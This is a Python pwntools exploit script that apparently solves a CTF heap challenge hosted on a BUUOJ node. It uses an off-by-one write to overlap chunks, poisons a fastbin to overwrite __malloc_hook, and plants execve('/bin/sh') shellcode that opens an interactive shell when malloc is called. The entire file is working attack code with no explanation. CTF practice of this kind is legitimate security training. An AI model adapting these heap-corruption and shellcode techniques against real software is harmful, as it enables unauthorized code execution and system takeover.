from pwn import *

context(arch = 'amd64', os = 'linux')
#context.log_level = 'debug'

#io = process("./pwn")
io = remote('node4.buuoj.cn', 29980)

sd   = lambda s    : io.send(s)
sda  = lambda s, n : io.sendafter(s, n)
sl   = lambda s    : io.sendline(s)
sla  = lambda s, n : io.sendlineafter(s, n)
rc   = lambda n    : io.recv(n)
rut  = lambda s    : io.recvuntil(s, drop=True)
ruf  = lambda s    : io.recvuntil(s, drop=False)
addr = lambda s    : u64(io.recvintl(s, drop=True).ljust(8, b'\x00'))
sh   = lambda      : io.interactive()

def debug():
	gdb.attach(io)
	pause()

menu = b'4. Exit\n-----------------\n'
def add(size, content, line = True):
	sla(menu, b'1')
	sla(b'Size:\n', str(size).encode())
	if line:
		sla(b'Note:\n', content)
	else:
		sda(b'Note:\n', content)

def dele(idx):
	sla(menu, b'2')
	sla(b'Index of Note:\n', str(idx).encode())

def edit(idx, content, line = True):
	sla(menu, b'3')
	sla(b'Index of Note:\n', str(idx).encode())
	if line:
		sla(b'Note:\n', content)
	else:
		sda(b'Note:\n', content)

shellcode = asm('''
	xor rsi, rsi
	mul esi
	push rax
	mov rbx, 0x68732f2f6e69622f
	push rbx
	push rsp
	pop rdi
	mov al, 59
	syscall
''')

malloc_hook = 0x6CB788
fake_chunk = malloc_hook - 0x16
add(0x18, b'A') # 0
add(0x48, b'A') # 1
add(0x38, b'A') # 2
add(0x10, b'A') # 3

edit(0, b'A'*0x18, False)
edit(0, b'A'*0x18 + b'\x91', False)
dele(2)
dele(1)

payload = b'A'*0x40 + p64(0) + p64(0x41) + p64(fake_chunk)
add(0x80, payload)
add(0x30, b'A')

payload = b'A'*6 + p64(malloc_hook+8) + shellcode
print(hex(len(payload)))
add(0x38, payload)

sla(menu, b'1')
sla(b'Size:\n', b'1')
sh()
